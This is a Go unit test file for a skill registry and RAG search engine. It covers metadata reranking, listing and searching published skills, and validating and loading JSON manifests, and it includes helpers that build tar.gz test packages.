func TestRerankByMetadata_AllZeroDownloadsAndRating(t *testing.T) {
	r := &RAGEngine{}
	results := []scoredResult{
		{skill: repository.Skill{ID: "a", Downloads: 0, Rating: 0, UpdatedAt: time.Now()}, score: 0.5, vectorScore: 0.3, bm25Score: 0.2},
		{skill: repository.Skill{ID: "b", Downloads: 0, Rating: 0, UpdatedAt: time.Now()}, score: 0.3, vectorScore: 0.1, bm25Score: 0.1},
	}
	reranked := r.rerankByMetadata(results)
	if len(reranked) != 2 {
		t.Fatalf("expected 2 results, got %d", len(reranked))
	}
}

func TestRerankByMetadata_AllVerified(t *testing.T) {
	r := &RAGEngine{}
	results := []scoredResult{
		{skill: repository.Skill{ID: "a", Downloads: 10, Rating: 5.0, IsVerified: true, UpdatedAt: time.Now()}, score: 0.5, vectorScore: 0.3, bm25Score: 0.2},
		{skill: repository.Skill{ID: "b", Downloads: 10, Rating: 5.0, IsVerified: true, UpdatedAt: time.Now()}, score: 0.5, vectorScore: 0.3, bm25Score: 0.2},
	}
	reranked := r.rerankByMetadata(results)
	if len(reranked) != 2 {
		t.Fatalf("expected 2 results, got %d", len(reranked))
	}
}

// --- Registry Tests (existing) ---

func TestNewRegistry(t *testing.T) {
	r := NewRegistry()
	if r == nil {
		t.Fatal("expected non-nil registry")
	}
	if len(r.skills) != 0 {
		t.Errorf("expected empty registry, got %d skills", len(r.skills))
	}
}

func TestRegisterAndGet(t *testing.T) {
	r := NewRegistry()
	skill := &Skill{
		ID:           "skill-1",
		IsPublished:  true,
		Manifest:     Manifest{Name: "test-skill", Version: "1.0.0", Description: "A test", Category: "security"},
		InstallCount: 10,
		CreatedAt:    time.Now(),
	}
	r.Register(skill)
	got, ok := r.Get("skill-1")
	if !ok {
		t.Fatal("expected to find skill-1")
	}
	if got.Manifest.Name != "test-skill" {
		t.Errorf("expected name 'test-skill', got %q", got.Manifest.Name)
	}
}

func TestGet_NotFound(t *testing.T) {
	r := NewRegistry()
	_, ok := r.Get("nonexistent")
	if ok {
		t.Error("expected not found")
	}
}

func TestList_PublishedOnly(t *testing.T) {
	r := NewRegistry()
	r.Register(&Skill{ID: "pub1", IsPublished: true, Manifest: Manifest{Category: "security"}})
	r.Register(&Skill{ID: "draft1", IsPublished: false, Manifest: Manifest{Category: "security"}})
	r.Register(&Skill{ID: "pub2", IsPublished: true, Manifest: Manifest{Category: "utility"}})
	result := r.List("", 10)
	if len(result) != 2 {
		t.Errorf("expected 2 published skills, got %d", len(result))
	}
}

func TestList_FilterByCategory(t *testing.T) {
	r := NewRegistry()
	r.Register(&Skill{ID: "s1", IsPublished: true, Manifest: Manifest{Category: "security"}})
	r.Register(&Skill{ID: "s2", IsPublished: true, Manifest: Manifest{Category: "utility"}})
	r.Register(&Skill{ID: "s3", IsPublished: true, Manifest: Manifest{Category: "security"}})
	result := r.List("security", 10)
	if len(result) != 2 {
		t.Errorf("expected 2 security skills, got %d", len(result))
	}
}

func TestList_Limit(t *testing.T) {
	r := NewRegistry()
	for i := 0; i < 5; i++ {
		r.Register(&Skill{ID: string(rune('a' + i)), IsPublished: true, Manifest: Manifest{Category: "cat"}})
	}
	result := r.List("", 3)
	if len(result) != 3 {
		t.Errorf("expected 3 skills with limit, got %d", len(result))
	}
}

func TestSearch(t *testing.T) {
	r := NewRegistry()
	r.Register(&Skill{ID: "s1", IsPublished: true, Manifest: Manifest{Name: "auth-scanner", DisplayName: "Auth Scanner", Description: "Scans authentication"}})
	r.Register(&Skill{ID: "s2", IsPublished: true, Manifest: Manifest{Name: "sql-fixer", DisplayName: "SQL Fixer", Description: "Fixes SQL injection"}})
	r.Register(&Skill{ID: "s3", IsPublished: false, Manifest: Manifest{Name: "auth-helper", Description: "Hidden auth tool"}})
	result := r.Search("auth", 10)
	if len(result) != 1 {
		t.Errorf("expected 1 published auth skill, got %d", len(result))
	}
}

func TestSearch_MatchDescription(t *testing.T) {
	r := NewRegistry()
	r.Register(&Skill{ID: "s1", IsPublished: true, Manifest: Manifest{Name: "tool-x", Description: "SQL injection scanner"}})
	result := r.Search("sql", 10)
	if len(result) != 1 {
		t.Errorf("expected 1 match, got %d", len(result))
	}
}

func TestSearch_Limit(t *testing.T) {
	r := NewRegistry()
	for i := 0; i < 5; i++ {
		r.Register(&Skill{ID: string(rune('a' + i)), IsPublished: true, Manifest: Manifest{Name: "auth-tool", Description: "auth tool"}})
	}
	result := r.Search("auth", 2)
	if len(result) != 2 {
		t.Errorf("expected 2 results with limit, got %d", len(result))
	}
}

func TestValidateManifest(t *testing.T) {
	valid := &Manifest{Name: "test", Version: "1.0", Description: "desc", Category: "cat"}
	if err := ValidateManifest(valid); err != nil {
		t.Errorf("expected valid manifest, got %v", err)
	}
	tests := []struct {
		name     string
		manifest *Manifest
	}{
		{"empty name", &Manifest{Version: "1.0", Description: "desc", Category: "cat"}},
		{"empty version", &Manifest{Name: "test", Description: "desc", Category: "cat"}},
		{"empty description", &Manifest{Name: "test", Version: "1.0", Category: "cat"}},
		{"empty category", &Manifest{Name: "test", Version: "1.0", Description: "desc"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateManifest(tt.manifest); err == nil {
				t.Error("expected validation error")
			}
		})
	}
}

func TestLoadManifest(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "manifest.json")
	data := `{"name":"test-skill","version":"1.0.0","description":"A test skill","category":"security","entry_point":"main.go"}`
	os.WriteFile(path, []byte(data), 0644)

	manifest, err := LoadManifest(path)
	if err != nil {
		t.Fatalf("LoadManifest failed: %v", err)
	}
	if manifest.Name != "test-skill" {
		t.Errorf("expected name 'test-skill', got %q", manifest.Name)
	}
	if manifest.Category != "security" {
		t.Errorf("expected category 'security', got %q", manifest.Category)
	}
}

func TestLoadManifest_NotFound(t *testing.T) {
	_, err := LoadManifest("/nonexistent/manifest.json")
	if err == nil {
		t.Error("expected error for nonexistent file")
	}
}

func TestLoadManifest_InvalidJSON(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "bad.json")
	os.WriteFile(path, []byte("not json"), 0644)
	_, err := LoadManifest(path)
	if err == nil {
		t.Error("expected error for invalid JSON")
	}
}

func TestGetSkillDir(t *testing.T) {
	got := GetSkillDir("/skills", "my-skill")
	expected := filepath.Join("/skills", "my-skill")
	if got != expected {
		t.Errorf("expected %q, got %q", expected, got)
	}
}

// --- Helpers ---

type tarEntry struct {
	name     string
	content  string
	typeflag byte
}

func buildTestPackage(t *testing.T, entries []tarEntry) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for _, e := range entries {
		data := []byte(e.content)
		hdr := &tar.Header{
			Name:     e.name,
			Mode:     0644,
			Size:     int64(len(data)),
			Typeflag: e.typeflag,
			ModTime:  time.Now(),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		tw.Write(data)
	}
	tw.Close()
	gw.Close()
	return buf.Bytes()
}

func newTestTarGz(t *testing.T, entries []tarEntry) *bytes.Buffer {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for _, e := range entries {
		data := []byte(e.content)
		hdr := &tar.Header{
			Name:     e.name,
			Mode:     0644,
			Size:     int64(len(data)),
			Typeflag: e.typeflag,
			ModTime:  time.Now(),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if e.typeflag == tar.TypeReg {
			tw.Write(data)
		}
	}
	tw.Close()
	gw.Close()
	return &buf
}

// Ensure io is used (for the ReadAll error test)
var _ = io.LimitReader
